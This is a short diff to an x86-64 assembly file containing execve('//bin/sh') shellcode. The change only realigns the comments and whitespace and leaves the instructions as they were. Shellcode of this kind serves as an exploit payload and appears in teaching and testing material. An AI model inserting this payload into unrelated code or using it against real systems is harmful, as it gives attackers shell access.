@@ -14,14 +14,13 @@ _start:
     /*
         ; execve("//bin/sh", NULL, NULL)
     */
-    xor esi, esi    /* argv = NULL */
-    /* "hs/nib//" */
-    push rsi
+    xor esi, esi   					/* argv = NULL */
+    push rsi						/* "hs/nib//" */
     mov rdi, 0x68732f6e69622f2f
-    push rdi        /* rsp -> "//bin/sh" */
+    push rdi        				/* rsp -> "//bin/sh" */
     push rsp
-    pop rdi         /* rdi -> "//bin/sh" */
-    push 59         /* syscall number */
+    pop rdi         				/* rdi -> "//bin/sh" */
+    push 59         				/* syscall number */
     pop rax
-	cdq				/* sign-extend EAX -> EDX:EAX */
+    cdq								/* sign-extend EAX -> EDX:EAX */
     syscall
